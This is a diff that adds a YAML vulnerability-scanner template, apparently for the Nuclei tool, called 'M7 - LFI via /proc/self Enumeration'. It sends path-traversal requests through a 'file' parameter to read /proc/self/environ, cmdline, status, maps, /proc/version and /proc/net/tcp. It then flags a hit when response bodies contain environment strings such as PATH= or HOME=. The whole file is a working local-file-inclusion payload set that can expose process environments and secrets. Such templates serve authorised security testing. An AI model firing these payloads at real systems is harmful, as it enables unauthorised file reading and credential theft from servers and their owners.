@@ -1,0 +1,32 @@
+id: m7-lfi-proc-self
+info:
+  name: M7 - LFI via /proc/self Enumeration
+  author: Sharlix
+  severity: high
+  description: LFI targeting Linux /proc/self for environment variables and cmdline
+  tags: lfi,linux,proc,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../../proc/self/environ"
+      - "{{BaseURL}}?file=../../../../proc/self/cmdline"
+      - "{{BaseURL}}?file=../../../../proc/self/status"
+      - "{{BaseURL}}?file=../../../../proc/self/maps"
+      - "{{BaseURL}}?file=/proc/self/environ"
+      - "{{BaseURL}}?file=/proc/version"
+      - "{{BaseURL}}?file=/proc/net/tcp"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "PATH="
+          - "HOME="
+          - "USER="
+          - "SHELL="
+          - "HTTP_USER_AGENT"
+          - "MemTotal"
+          - "VmRSS"
+        part: body
+        condition: or
